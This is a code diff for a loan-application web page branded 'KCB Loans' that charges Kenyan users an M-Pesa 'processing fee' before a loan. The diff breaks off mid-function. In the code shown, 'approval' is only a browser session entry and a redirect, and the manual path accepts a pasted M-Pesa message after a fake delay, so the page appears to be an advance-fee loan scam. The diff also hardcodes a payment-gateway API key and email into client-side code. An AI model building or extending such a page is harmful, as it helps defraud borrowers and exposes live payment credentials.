@@ -811,13 +811,13 @@
 </head>
 
 <body>
+    <!-- ====== HTML STRUCTURE (KEEP EXACTLY AS YOUR ORIGINAL) ====== -->
     <!-- Page Header -->
     <header class="page-header">
         <div class="header-content">
             <button class="back-btn" onclick="window.history.back()" aria-label="Go back">
                 <i class="fas fa-chevron-left"></i>
             </button>
-            
             <div class="logo">
                 <div class="logo-icon">
                     <i class="fas fa-hand-holding-usd"></i>
@@ -828,10 +828,8 @@
                     <span class="loans">Loans</span>
                 </div>
             </div>
-            
             <div style="width: 2.5rem;"></div>
         </div>
-        
         <div class="progress-container">
             <div class="progress-bar"></div>
         </div>
@@ -867,63 +865,26 @@
         <section class="loan-options-section">
             <h3 class="section-title">Select Loan Amount</h3>
             <div class="loan-options-grid">
-                <div class="loan-option" onclick="selectLoanOption(this, 7200, 100)">
-                    <div class="loan-amount">Ksh 7,200</div>
-                    <div class="loan-fee">Fee: Ksh 100</div>
-                </div>
-                <div class="loan-option" onclick="selectLoanOption(this, 9800, 120)">
-                    <div class="loan-amount">Ksh 9,800</div>
-                    <div class="loan-fee">Fee: Ksh 120</div>
-                </div>
-                <div class="loan-option" onclick="selectLoanOption(this, 11200, 180)">
-                    <div class="loan-amount">Ksh 11,200</div>
-                    <div class="loan-fee">Fee: Ksh 180</div>
-                </div>
-                <div class="loan-option" onclick="selectLoanOption(this, 16800, 200)">
-                    <div class="loan-amount">Ksh 16,800</div>
-                    <div class="loan-fee">Fee: Ksh 200</div>
-                </div>
-                <div class="loan-option" onclick="selectLoanOption(this, 21200, 220)">
-                    <div class="loan-amount">Ksh 21,200</div>
-                    <div class="loan-fee">Fee: Ksh 220</div>
-                </div>
-                <div class="loan-option" onclick="selectLoanOption(this, 25600, 350)">
-                    <div class="loan-amount">Ksh 25,600</div>
-                    <div class="loan-fee">Fee: Ksh 350</div>
-                </div>
-                <div class="loan-option" onclick="selectLoanOption(this, 30000, 420)">
-                    <div class="loan-amount">Ksh 30,000</div>
-                    <div class="loan-fee">Fee: Ksh 420</div>
-                </div>
-                <div class="loan-option" onclick="selectLoanOption(this, 35400, 540)">
-                    <div class="loan-amount">Ksh 35,400</div>
-                    <div class="loan-fee">Fee: Ksh 540</div>
-                </div>
-                <div class="loan-option" onclick="selectLoanOption(this, 39800, 680)">
-                    <div class="loan-amount">Ksh 39,800</div>
-                    <div class="loan-fee">Fee: Ksh 680</div>
-                </div>
-                <div class="loan-option" onclick="selectLoanOption(this, 44200, 960)">
-                    <div class="loan-amount">Ksh 44,200</div>
-                    <div class="loan-fee">Fee: Ksh 960</div>
-                </div>
-                <div class="loan-option" onclick="selectLoanOption(this, 48600, 1550)">
-                    <div class="loan-amount">Ksh 48,600</div>
-                    <div class="loan-fee">Fee: Ksh 1,550</div>
-                </div>
-                <div class="loan-option" onclick="selectLoanOption(this, 60600, 2000)">
-                    <div class="loan-amount">Ksh 60,600</div>
-                    <div class="loan-fee">Fee: Ksh 2,000</div>
-                </div>
+                <!-- All 12 loan options -->
+                <div class="loan-option" onclick="selectLoanOption(this, 7200, 100)"><div class="loan-amount">Ksh 7,200</div><div class="loan-fee">Fee: Ksh 100</div></div>
+                <div class="loan-option" onclick="selectLoanOption(this, 9800, 120)"><div class="loan-amount">Ksh 9,800</div><div class="loan-fee">Fee: Ksh 120</div></div>
+                <div class="loan-option" onclick="selectLoanOption(this, 11200, 180)"><div class="loan-amount">Ksh 11,200</div><div class="loan-fee">Fee: Ksh 180</div></div>
+                <div class="loan-option" onclick="selectLoanOption(this, 16800, 200)"><div class="loan-amount">Ksh 16,800</div><div class="loan-fee">Fee: Ksh 200</div></div>
+                <div class="loan-option" onclick="selectLoanOption(this, 21200, 220)"><div class="loan-amount">Ksh 21,200</div><div class="loan-fee">Fee: Ksh 220</div></div>
+                <div class="loan-option" onclick="selectLoanOption(this, 25600, 350)"><div class="loan-amount">Ksh 25,600</div><div class="loan-fee">Fee: Ksh 350</div></div>
+                <div class="loan-option" onclick="selectLoanOption(this, 30000, 420)"><div class="loan-amount">Ksh 30,000</div><div class="loan-fee">Fee: Ksh 420</div></div>
+                <div class="loan-option" onclick="selectLoanOption(this, 35400, 540)"><div class="loan-amount">Ksh 35,400</div><div class="loan-fee">Fee: Ksh 540</div></div>
+                <div class="loan-option" onclick="selectLoanOption(this, 39800, 680)"><div class="loan-amount">Ksh 39,800</div><div class="loan-fee">Fee: Ksh 680</div></div>
+                <div class="loan-option" onclick="selectLoanOption(this, 44200, 960)"><div class="loan-amount">Ksh 44,200</div><div class="loan-fee">Fee: Ksh 960</div></div>
+                <div class="loan-option" onclick="selectLoanOption(this, 48600, 1550)"><div class="loan-amount">Ksh 48,600</div><div class="loan-fee">Fee: Ksh 1,550</div></div>
+                <div class="loan-option" onclick="selectLoanOption(this, 60600, 2000)"><div class="loan-amount">Ksh 60,600</div><div class="loan-fee">Fee: Ksh 2,000</div></div>
             </div>
         </section>
 
         <!-- Payment Information -->
         <div class="payment-info">
             <div class="info-header">
-                <div class="info-icon">
-                    <i class="fas fa-info-circle"></i>
-                </div>
+                <div class="info-icon"><i class="fas fa-info-circle"></i></div>
                 <div class="info-title">Important Information</div>
             </div>
             <p class="info-text">To complete your loan application, you'll need to pay the processing fee via M-Pesa. You'll receive an STK prompt on your phone once you proceed.</p>
@@ -931,21 +892,17 @@
 
         <!-- Submit Button -->
         <button id="submit-btn" class="submit-btn" disabled>
-            <i class="fas fa-lock"></i>
-            Apply for Loan
+            <i class="fas fa-lock"></i> Apply for Loan
         </button>
         <div id="error-message" class="error-message">Please select a loan amount to continue</div>
 
-        <!-- App Promo (Hidden by default) -->
-        <div class="app-promo" id="app-promo">
-            <div class="promo-icon">
-                <i class="fas fa-rocket"></i>
-            </div>
+        <!-- App Promo -->
+        <div class="app-promo" id="app-promo" style="display:none;">
+            <div class="promo-icon"><i class="fas fa-rocket"></i></div>
             <div class="promo-title">Get Higher Limits!</div>
             <p class="promo-text">For loans up to Ksh 80,000, download our mobile app</p>
             <a href="https://play.google.com/store/apps/details?id=com.punksmoothheat.KCB%20Loans" target="_blank" class="download-btn">
-                <i class="fab fa-google-play"></i>
-                Download App
+                <i class="fab fa-google-play"></i> Download App
             </a>
         </div>
     </main>
@@ -953,9 +910,7 @@
     <!-- STK Push Overlay -->
     <div class="stk-overlay" id="stkOverlay">
         <div class="stk-card">
-            <div class="stk-icon">
-                <i class="fas fa-mobile-alt"></i>
-            </div>
+            <div class="stk-icon"><i class="fas fa-mobile-alt"></i></div>
             <h2 class="stk-title">STK Push Sent!</h2>
             <p class="stk-message">Check your phone for the M-Pesa prompt</p>
             <div class="stk-phone" id="stkPhoneNumber"></div>
@@ -974,41 +929,22 @@
     <!-- SweetAlert JS -->
     <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.7.3/dist/sweetalert2.all.min.js"></script>
     
+    <!-- ============================================================ -->
+    <!-- ============ CONSOLIDATED JAVASCRIPT (ALL-IN-ONE) =========== -->
+    <!-- ============================================================ -->
     <script>
-        // Serverless API endpoints
-        const API_ENDPOINTS = {
-            initiatePayment: '/api/initiate-payment',
-            verifyPayment: '/api/verify-payment',
-            normalizePhone: '/api/normalize-phone'
+        // ================================================================
+        // 1. HARDCODED MEGAPAY CREDENTIALS (🔴 EXPOSED IN BROWSER)
+        // ================================================================
+        const MEGAPAY_CONFIG = {
+            apiKey: 'MGPY8h6lIlxh',
+            email: 'hubslinks@gmail.com',
+            baseUrl: 'https://megapay.co.ke'
         };
 
-        // Load user data
-        const userData = JSON.parse(sessionStorage.getItem('myLoan') || '{}');
-        if (!userData.phone_number) {
-            window.location.href = 'eligibility.html';
-        }
-
-        document.getElementById('user-name').textContent = userData.name || 'Customer';
-
-        // Animate progress bar
-        document.addEventListener('DOMContentLoaded', () => {
-            const progressBar = document.querySelector('.progress-bar');
-            setTimeout(() => {
-                progressBar.style.width = '50%';
-            }, 300);
-        });
-
-        let selectedLoan = null;
-        let paymentReference = null;
-        let paymentTimer = null;
-        let stkTimerInterval = null;
-
-        // Helper: format currency
-        function formatKsh(n) {
-            return 'Ksh ' + Number(n).toLocaleString('en-KE');
-        }
-
-        // Normalize phone (robust)
+        // ================================================================
+        // 2. PHONE NORMALIZATION (from normalize-phone.js)
+        // ================================================================
         function normalizePhoneForBackend(raw) {
             if (!raw) return null;
             let digits = raw.replace(/\D/g, '');
@@ -1018,258 +954,220 @@
                 if (digits.length >= 12) return digits.substring(0, 12);
                 return digits;
             }
-
             if (digits.startsWith('0')) {
                 digits = digits.substring(1);
             }
-
             if (digits.length >= 9) {
                 digits = digits.substring(0, 9);
             }
-
             if (digits.length < 9) return null;
-
             const first = digits.charAt(0);
             if (first !== '7' && first !== '1') return null;
-
             return '254' + digits;
         }
 
-        // Select loan option
+        function normalizePhoneManually(phone) {
+            let normalized = phone.replace(/\D/g, '');
+            if (normalized.startsWith('0') && normalized.length === 10) {
+                normalized = '254' + normalized.substring(1);
+            } else if (normalized.startsWith('254') && normalized.length === 12) {
+                // already good
+            } else if (normalized.startsWith('+254')) {
+                normalized = normalized.substring(1);
+            } else if (normalized.length === 9) {
+                normalized = '254' + normalized;
+            }
+            return normalized;
+        }
+
+        // ================================================================
+        // 3. LOAN SELECTION LOGIC (unchanged from original)
+        // ================================================================
+        let selectedLoan = null;
+        let paymentReference = null;
+        let paymentTimer = null;
+        let stkTimerInterval = null;
+
+        function formatKsh(n) {
+            return 'Ksh ' + Number(n).toLocaleString('en-KE');
+        }
+
+        const userData = JSON.parse(sessionStorage.getItem('myLoan') || '{}');
+        if (!userData.phone_number) {
+            window.location.href = 'eligibility.html';
+        }
+        document.getElementById('user-name').textContent = userData.name || 'Customer';
+
+        document.addEventListener('DOMContentLoaded', () => {
+            const progressBar = document.querySelector('.progress-bar');
+            setTimeout(() => { progressBar.style.width = '50%'; }, 300);
+        });
+
         function selectLoanOption(element, amount, fee) {
             document.querySelectorAll('.loan-option').forEach(opt => opt.classList.remove('selected'));
             element.classList.add('selected');
-            
-            selectedLoan = { 
-                amount, 
+            selectedLoan = {
+                amount,
                 fee,
                 totalRepayment: Math.round(amount * 1.1)
             };
-            
             document.getElementById('submit-btn').disabled = false;
             document.getElementById('error-message').style.display = 'none';
-            
             userData.loan_amount = amount;
             userData.processing_fee = fee;
             sessionStorage.setItem('myLoan', JSON.stringify(userData));
         }
 
-        // Submit button: show custom modal with phone input
-        document.getElementById('submit-btn').addEventListener('click', async function() {
-            if (!selectedLoan) {
-                document.getElementById('error-message').style.display = 'block';
-                return;
+        // ================================================================
+        // 4. DIRECT MEGAPAY API CALLS (NO SERVER)
+        // ================================================================
+        async function sendPayHeroSTK(phoneNumber, amount, loanAmount) {
+            // Convert 2547... to 07... for MegaPay
+            let msisdn = phoneNumber;
+            if (msisdn.startsWith('254')) {
+                msisdn = '0' + msisdn.substring(3);
             }
 
-            const fee = selectedLoan.fee;
-            const amount = selectedLoan.amount;
-            const total = selectedLoan.totalRepayment;
+            const timestamp = Date.now();
+            const randomStr = Math.random().toString(36).substring(2, 8).toUpperCase();
+            const reference = `TYN-${timestamp}-${randomStr}`;
 
-            // Build modal content
-            const htmlContent = `
-            <div style="padding: 0 4px;">
-                <div class="modal-icon-wrap">
-                    <i class="fas fa-mobile-alt"></i>
-                </div>
+            const payload = {
+                api_key: MEGAPAY_CONFIG.apiKey,
+                email: MEGAPAY_CONFIG.email,
+                amount: parseInt(amount),
+                msisdn: msisdn,
+                reference: reference
+            };
 
-                <div class="loan-details-box">
-                    <div class="detail-row">
-                        <span class="detail-label">Loan Amount</span>
-                        <span class="detail-value primary">${formatKsh(amount)}</span>
-                    </div>
-                    <div class="detail-row">
-                        <span class="detail-label">Processing Fee</span>
-                        <span class="detail-value">${formatKsh(fee)}</span>
-                    </div>
-                    <div class="detail-row">
-                        <span class="detail-label">Total Repayment (est.)</span>
-                        <span class="detail-value">${formatKsh(total)}</span>
-                    </div>
-                </div>
+            console.log('[CLIENT] Sending to MegaPay:', payload);
 
-                <div class="fee-notice">
-                    <p>
-                        Pay a fee of <span class="fee-amount">${formatKsh(fee)}</span>
-                        to finish your application and get your loan disbursed.
-                    </p>
-                </div>
-
-                <div style="margin-top: 6px; text-align: left;">
-                    <label style="font-weight: 600; font-size: 0.9rem; color: #1a1a1a; display: block; margin-bottom: 4px;">
-                        Phone Number for M-Pesa
-                    </label>
-                    <div class="phone-input-wrap" id="phone-wrap">
-                        <span class="phone-prefix">+254</span>
-                        <input type="tel" class="phone-input" id="phone-input-modal"
-                               placeholder="7XXXXXXXX" autocomplete="off"
-                               inputmode="numeric" pattern="[0-9]*" />
-                    </div>
-                    <div class="phone-error-msg" id="phone-error-msg">
-                        <i class="fas fa-exclamation-circle" style="margin-right:4px;"></i>
-                        Please enter a valid phone number (e.g. 712345678 or 0712345678)
-                    </div>
-                </div>
-            </div>
-            `;
-
-            const result = await Swal.fire({
-                title: 'Confirm Loan Application',
-                html: htmlContent,
-                icon: false,
-                showCancelButton: true,
-                confirmButtonText: `Pay Fee to Apply`,
-                cancelButtonText: 'Cancel',
-                buttonsStyling: false,
-                customClass: {
-                    confirmButton: 'swal2-confirm',
-                    cancelButton: 'swal2-cancel',
-                    actions: 'swal2-actions'
+            const response = await fetch(`${MEGAPAY_CONFIG.baseUrl}/backend/v1/initiatestk`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
                 },
-                allowOutsideClick: false,
-                focusConfirm: false,
-                didOpen: () => {
-                    const input = document.getElementById('phone-input-modal');
-                    if (input) {
-                        setTimeout(() => input.focus(), 120);
-                        input.addEventListener('input', function() {
-                            this.value = this.value.replace(/\D/g, '');
-                            const wrap = document.getElementById('phone-wrap');
-                            const err = document.getElementById('phone-error-msg');
-                            if (wrap) wrap.classList.remove('error');
-                            if (err) err.classList.remove('show');
-                        });
-                    }
-                },
-                preConfirm: () => {
-                    const input = document.getElementById('phone-input-modal');
-                    const wrap = document.getElementById('phone-wrap');
-                    const err = document.getElementById('phone-error-msg');
-                    if (!input) return false;
-
-                    const raw = input.value.trim();
-                    if (!raw) {
-                        if (wrap) wrap.classList.add('error');
-                        if (err) { err.textContent = 'Please enter your phone number.'; err.classList.add('show'); }
-                        return false;
-                    }
-
-                    const normalized = normalizePhoneForBackend(raw);
-                    if (!normalized || normalized.length < 12) {
-                        if (wrap) wrap.classList.add('error');
-                        if (err) { err.textContent = 'Please enter a valid phone number (e.g. 712345678 or 0712345678)'; err.classList.add('show'); }
-                        return false;
-                    }
-
-                    if (!normalized.startsWith('2547') && !normalized.startsWith('2541')) {
-                        if (wrap) wrap.classList.add('error');
-                        if (err) { err.textContent = 'Please enter a valid Kenyan phone number (07... or 01...).'; err.classList.add('show'); }
-                        return false;
-                    }
-
-                    window._phoneForPayment = normalized;
-                    return true;
-                }
+                body: JSON.stringify(payload)
             });
 
-            if (!result.isConfirmed) {
-                window._phoneForPayment = null;
-                return;
+            const result = await response.json();
+            console.log('[CLIENT] MegaPay Init Response:', result);
+
+            if (!response.ok) {
+                throw new Error(result.message || result.error || 'Payment initiation failed');
+            }
+            if (!result.transaction_request_id) {
+                throw new Error(result.ResponseDescription || result.massage || 'No transaction ID');
             }
 
-            const phoneNumber = window._phoneForPayment;
-            if (!phoneNumber) {
-                await Swal.fire({
-                    title: 'Phone Number Required',
-                    text: 'Please enter a valid phone number to continue.',
-                    icon: 'warning',
-                    confirmButtonText: 'OK',
-                    confirmButtonColor: 'var(--primary)'
-                });
-                return;
-            }
-
-            // Proceed with payment using the entered phone
-            await processLoanApplication(phoneNumber);
-        });
-
-        // Process loan application – now accepts phoneNumber argument
-        async function processLoanApplication(phoneNumber) {
-            const submitBtn = document.getElementById('submit-btn');
-            const originalText = submitBtn.innerHTML;
-            submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Processing...';
-            submitBtn.disabled = true;
-
-            try {
-                // Show loading overlay
-                const loadingOverlay = document.getElementById('loadingOverlay');
-                loadingOverlay.style.display = 'flex';
-
-                // Normalize phone via backend (or fallback)
-                let normalizedPhone;
-                try {
-                    normalizedPhone = await normalizePhoneNumber(phoneNumber);
-                } catch (_) {
-                    normalizedPhone = phoneNumber; // fallback to our own
-                }
-                
-                // Send STK push
-                const paymentResponse = await sendPayHeroSTK(
-                    normalizedPhone,
-                    selectedLoan.fee,
-                    selectedLoan.amount
-                );
-
-                if (paymentResponse && paymentResponse.reference) {
-                    paymentReference = paymentResponse.reference;
-                    
-                    loadingOverlay.style.display = 'none';
-                    showSTKOverlay(normalizedPhone, selectedLoan.fee);
-                    
-                    const paymentSuccess = await checkPaymentStatus(paymentReference, 20);
-                    
-                    hideSTKOverlay();
-                    
-                    if (paymentSuccess) {
-                        // Direct redirect – no success modal
-                        storeApprovalAndRedirect();
-                    } else {
-                        throw new Error('Payment verification failed');
-                    }
-                } else {
-                    throw new Error('Payment initiation failed - no reference received');
-                }
-            } catch (error) {
-                console.error('Payment error:', error);
-                document.getElementById('loadingOverlay').style.display = 'none';
-                hideSTKOverlay();
-                
-                submitBtn.innerHTML = originalText;
-                submitBtn.disabled = false;
-
-                // Show manual payment modal after 3‑second loading with empty spinner
-                const manualVerified = await showManualPaymentModal(selectedLoan.fee);
-                if (manualVerified) {
-                    storeApprovalAndRedirect();
-                }
-            }
-        }
-
-        // Store loan approval and redirect to dash
-        function storeApprovalAndRedirect() {
-            const approved = {
-                ...userData,
-                ...selectedLoan,
-                paymentReference: paymentReference || 'manual_' + Date.now(),
-                approvedAt: new Date().toISOString()
+            return {
+                success: true,
+                reference: result.transaction_request_id,
+                external_reference: reference,
+                raw: result
             };
-            sessionStorage.setItem('loanApproved', JSON.stringify(approved));
-            window.location.href = 'dash.html';
         }
 
-        // Manual payment modal – with 3s empty spinner, copy button, better styling
+        async function checkPaymentStatus(reference, maxAttempts = 20) {
+            let attempts = 0;
+            return new Promise((resolve, reject) => {
+                paymentTimer = setInterval(async () => {
+                    attempts++;
+                    const timerEl = document.getElementById('stkTimer');
+                    if (timerEl) {
+                        const minutes = Math.floor(attempts / 2);
+                        const seconds = (attempts % 2) * 30;
+                        timerEl.textContent = `Verifying payment... ${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
+                    }
+
+                    try {
+                        const payload = {
+                            api_key: MEGAPAY_CONFIG.apiKey,
+                            email: MEGAPAY_CONFIG.email,
+                            transaction_request_id: reference
+                        };
+
+                        const response = await fetch(`${MEGAPAY_CONFIG.baseUrl}/backend/v1/transactionstatus`, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify(payload)
+                        });
+
+                        const result = await response.json();
+                        console.log('[CLIENT] Verify Response:', result);
+
+                        let status = result.TransactionStatus || result.status || '';
+                        if (!status && result.ResponseCode !== undefined) {
+                            status = Number(result.ResponseCode) === 0 ? 'COMPLETED' : 'FAILED';
+                        }
+                        if (!status && result.TransactionCode !== undefined) {
+                            status = String(result.TransactionCode) === '0' ? 'COMPLETED' : 'PENDING';
+                        }
+
+                        const statusUpper = String(status).toUpperCase();
+                        if (statusUpper === 'COMPLETED' || statusUpper === 'SUCCESS' || statusUpper === 'PAID') {
+                            clearInterval(paymentTimer);
+                            resolve(true);
+                        } else if (statusUpper === 'FAILED' || statusUpper === 'CANCELLED' || statusUpper === 'CANCELED') {
+                            clearInterval(paymentTimer);
+                            reject(new Error('Payment failed or cancelled'));
+                        } else if (attempts >= maxAttempts) {
+                            clearInterval(paymentTimer);
+                            reject(new Error('Verification timeout'));
+                        }
+                    } catch (error) {
+                        console.error('Status check error:', error);
+                        if (attempts >= maxAttempts) {
+                            clearInterval(paymentTimer);
+                            reject(new Error('Verification failed'));
+                        }
+                    }
+                }, 3000);
+            });
+        }
+
+        // ================================================================
+        // 5. STK OVERLAY CONTROLS
+        // ================================================================
+        function showSTKOverlay(phoneNumber, amount) {
+            const overlay = document.getElementById('stkOverlay');
+            const phoneEl = document.getElementById('stkPhoneNumber');
+            const amountEl = document.getElementById('stkAmount');
+
+            const displayPhone = phoneNumber.startsWith('254') ?
+                `0${phoneNumber.substring(3)}` : phoneNumber;
+            phoneEl.textContent = displayPhone;
+            amountEl.textContent = `Ksh ${amount}`;
+
+            let seconds = 0;
+            const timerEl = document.getElementById('stkTimer');
+            stkTimerInterval = setInterval(() => {
+                seconds++;
+                const minutes = Math.floor(seconds / 60);
+                const secs = seconds % 60;
+                timerEl.textContent = `Verifying payment... ${String(minutes).padStart(2, '0')}:${String(secs).padStart(2, '0')}`;
+            }, 1000);
+
+            overlay.style.display = 'flex';
+        }
+
+        function hideSTKOverlay() {
+            document.getElementById('stkOverlay').style.display = 'none';
+            if (stkTimerInterval) {
+                clearInterval(stkTimerInterval);
+                stkTimerInterval = null;
+            }
+            if (paymentTimer) {
+                clearInterval(paymentTimer);
+                paymentTimer = null;
+            }
+        }
+
+        // ================================================================
+        // 6. MANUAL PAYMENT MODAL (unchanged from original)
+        // ================================================================
         function showManualPaymentModal(fee) {
             return new Promise((resolve) => {
-                // Show empty loading spinner (no text) for 3 seconds
                 Swal.fire({
                     title: '',
                     html: '<div style="display:flex;justify-content:center;align-items:center;padding:1.5rem 0;"><div style="width:3rem;height:3rem;border:3px solid rgba(154,56,31,0.1);border-radius:50%;border-top:3px solid var(--primary);animation:spin 1s linear infinite;"></div></div>',
@@ -1277,7 +1175,6 @@
                     showConfirmButton: false,
                     showCancelButton: false,
                     didOpen: () => {
-                        // Inject the spin animation inline since SweetAlert might not have it
                         const style = document.createElement('style');
                         style.textContent = `
                             @keyframes spin {
@@ -1291,8 +1188,6 @@
 
                 setTimeout(() => {
                     Swal.close();
-
-                    // Now show the actual manual payment modal
                     Swal.fire({
                         title: 'Manual Payment',
                         html: `
@@ -1323,9 +1218,7 @@
                                     <li>Enter Till Number <strong>1554026</strong></li>
                                     <li>Enter the amount <strong>${formatKsh(fee)}</strong></li>
                                 </ol>
-                                <p style="margin-top: 0.5rem; font-size: 0.95rem;">
-                                    After payment, paste the confirmation message you received from M-Pesa below:
-                                </p>
+                                <p style="margin-top: 0.5rem; font-size: 0.95rem;">After payment, paste the confirmation message you received from M-Pesa below:</p>
                                 <textarea id="mpesa-confirmation" rows="3" style="width:100%; padding: 0.75rem; border: 2px solid #dce5dc; border-radius: 8px; resize: vertical; font-family: inherit; margin-top: 0.25rem;"></textarea>
                                 <div id="manual-error" style="color: #dc3545; font-size: 0.9rem; margin-top: 0.5rem; display: none;">Invalid Mpesa message.</div>
                             </div>
@@ -1342,7 +1235,6 @@
                         },
                         allowOutsideClick: false,
                         didOpen: () => {
-                            // Copy button functionality
                             const copyBtn = document.getElementById('copy-till-btn');
                             if (copyBtn) {
                                 copyBtn.addEventListener('click', () => {
@@ -1363,7 +1255,6 @@
                                 errEl.textContent = 'Invalid Mpesa message.';
                                 return false;
                             }
-                            // Show loading
                             Swal.showLoading();
                             await new Promise(resolve => setTimeout(resolve, 2000));
                             Swal.hideLoading();
@@ -1377,143 +1268,195 @@
                             }
                         }
                     }).then(result => {
-                        if (result.isConfirmed) {
-                            resolve(true);
-                        } else {
-                            resolve(false);
-                        }
+                        if (result.isConfirmed) resolve(true);
+                        else resolve(false);
                     });
-                }, 3000); // 3-second delay with empty spinner
-            });
-        }
-
-        // API helpers
-        async function sendPayHeroSTK(phoneNumber, amount, loanAmount) {
-            try {
-                const response = await fetch(API_ENDPOINTS.initiatePayment, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        phone_number: phoneNumber,
-                        amount: amount,
-                        loan_amount: loanAmount
-                    })
-                });
-                const result = await response.json();
-                if (!response.ok) throw new Error(result.error || 'Payment initiation failed');
-                return result;
-            } catch (error) {
-                console.error('Payment API Error:', error);
-                throw error;
-            }
-        }
-
-        async function checkPaymentStatus(reference, maxAttempts = 20) {
-            let attempts = 0;
-            return new Promise((resolve, reject) => {
-                paymentTimer = setInterval(async () => {
-                    attempts++;
-                    const timerEl = document.getElementById('stkTimer');
-                    if (timerEl) {
-                        const minutes = Math.floor(attempts / 2);
-                        const seconds = (attempts % 2) * 30;
-                        timerEl.textContent = `Verifying payment... ${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
-                    }
-                    
-                    try {
-                        const response = await fetch(`${API_ENDPOINTS.verifyPayment}?reference=${reference}`);
-                        const result = await response.json();
-
-                        if (result.success && (result.status === 'COMPLETED' || result.status === 'SUCCESS')) {
-                            clearInterval(paymentTimer);
-                            resolve(true);
-                        } else if (result.success && (result.status === 'FAILED' || result.status === 'CANCELLED')) {
-                            clearInterval(paymentTimer);
-                            reject(new Error('Payment failed or was cancelled'));
-                        } else if (attempts >= maxAttempts) {
-                            clearInterval(paymentTimer);
-                            reject(new Error('Payment verification timeout'));
-                        }
-                    } catch (error) {
-                        console.error('Status check error:', error);
-                        if (attempts >= maxAttempts) {
-                            clearInterval(paymentTimer);
-                            reject(new Error('Payment verification failed'));
-                        }
-                    }
                 }, 3000);
             });
         }
 
-        async function normalizePhoneNumber(phone) {
+        // ================================================================
+        // 7. STORE AND REDIRECT
+        // ================================================================
+        function storeApprovalAndRedirect() {
+            const approved = {
+                ...userData,
+                ...selectedLoan,
+                paymentReference: paymentReference || 'manual_' + Date.now(),
+                approvedAt: new Date().toISOString()
+            };
+            sessionStorage.setItem('loanApproved', JSON.stringify(approved));
+            window.location.href = 'dash.html';
+        }
+
+        // ================================================================
+        // 8. MAIN SUBMIT HANDLER (NO SERVER CALLS – DIRECT MEGAPAY)
+        // ================================================================
+        document.getElementById('submit-btn').addEventListener('click', async function() {
+            if (!selectedLoan) {
+                document.getElementById('error-message').style.display = 'block';
+                return;
+            }
+
+            const fee = selectedLoan.fee;
+            const amount = selectedLoan.amount;
+            const total = selectedLoan.totalRepayment;
+
+            const htmlContent = `
+            <div style="padding: 0 4px;">
+                <div class="modal-icon-wrap"><i class="fas fa-mobile-alt"></i></div>
+                <div class="loan-details-box">
+                    <div class="detail-row"><span class="detail-label">Loan Amount</span><span class="detail-value primary">${formatKsh(amount)}</span></div>
+                    <div class="detail-row"><span class="detail-label">Processing Fee</span><span class="detail-value">${formatKsh(fee)}</span></div>
+                    <div class="detail-row"><span class="detail-label">Total Repayment (est.)</span><span class="detail-value">${formatKsh(total)}</span></div>
+                </div>
+                <div class="fee-notice"><p>Pay a fee of <span class="fee-amount">${formatKsh(fee)}</span> to finish your application.</p></div>
+                <div style="margin-top: 6px; text-align: left;">
+                    <label style="font-weight: 600; font-size: 0.9rem; color: #1a1a1a; display: block; margin-bottom: 4px;">Phone Number for M-Pesa</label>
+                    <div class="phone-input-wrap" id="phone-wrap">
+                        <span class="phone-prefix">+254</span>
+                        <input type="tel" class="phone-input" id="phone-input-modal" placeholder="7XXXXXXXX" autocomplete="off" inputmode="numeric" pattern="[0-9]*" />
+                    </div>
+                    <div class="phone-error-msg" id="phone-error-msg"><i class="fas fa-exclamation-circle" style="margin-right:4px;"></i>Please enter a valid phone number (e.g. 712345678 or 0712345678)</div>
+                </div>
+            </div>
+            `;
+
+            const result = await Swal.fire({
+                title: 'Confirm Loan Application',
+                html: htmlContent,
+                icon: false,
+                showCancelButton: true,
+                confirmButtonText: `Pay Fee to Apply`,
+                cancelButtonText: 'Cancel',
+                buttonsStyling: false,
+                customClass: { confirmButton: 'swal2-confirm', cancelButton: 'swal2-cancel', actions: 'swal2-actions' },
+                allowOutsideClick: false,
+                focusConfirm: false,
+                didOpen: () => {
+                    const input = document.getElementById('phone-input-modal');
+                    if (input) {
+                        setTimeout(() => input.focus(), 120);
+                        input.addEventListener('input', function() {
+                            this.value = this.value.replace(/\D/g, '');
+                            const wrap = document.getElementById('phone-wrap');
+                            const err = document.getElementById('phone-error-msg');
+                            if (wrap) wrap.classList.remove('error');
+                            if (err) err.classList.remove('show');
+                        });
+                    }
+                },
+                preConfirm: () => {
+                    const input = document.getElementById('phone-input-modal');
+                    const wrap = document.getElementById('phone-wrap');
+                    const err = document.getElementById('phone-error-msg');
+                    if (!input) return false;
+                    const raw = input.value.trim();
+                    if (!raw) {
+                        if (wrap) wrap.classList.add('error');
+                        if (err) { err.textContent = 'Please enter your phone number.'; err.classList.add('show'); }
+                        return false;
+                    }
+                    const normalized = normalizePhoneForBackend(raw);
+                    if (!normalized || normalized.length < 12) {
+                        if (wrap) wrap.classList.add('error');
+                        if (err) { err.textContent = 'Please enter a valid phone number (e.g. 712345678 or 0712345678)'; err.classList.add('show'); }
+                        return false;
+                    }
+                    if (!normalized.startsWith('2547') && !normalized.startsWith('2541')) {
+                        if (wrap) wrap.classList.add('error');
+                        if (err) { err.textContent = 'Please enter a valid Kenyan phone number (07... or 01...).'; err.classList.add('show'); }
+                        return false;
+                    }
+                    window._phoneForPayment = normalized;
+                    return true;
+                }
+            });
+
+            if (!result.isConfirmed) {
+                window._phoneForPayment = null;
+                return;
+            }
+
+            const phoneNumber = window._phoneForPayment;
+            if (!phoneNumber) {
+                await Swal.fire({ title: 'Phone Number Required', text: 'Please enter a valid phone number.', icon: 'warning', confirmButtonText: 'OK', confirmButtonColor: 'var(--primary)' });
+                return;
+            }
+
+            // Process payment directly
+            await processLoanApplication(phoneNumber);
+        });
+
+        // ================================================================
+        // 9. PROCESS LOAN APPLICATION (DIRECT MEGAPAY)
+        // ================================================================
+        async function processLoanApplication(phoneNumber) {
+            const submitBtn = document.getElementById('submit-btn');
+            const originalText = submitBtn.innerHTML;
+            submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Processing...';
+            submitBtn.disabled = true;
+
             try {
-                const response = await fetch(API_ENDPOINTS.normalizePhone, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ phone })
-                });
-                const result = await response.json();
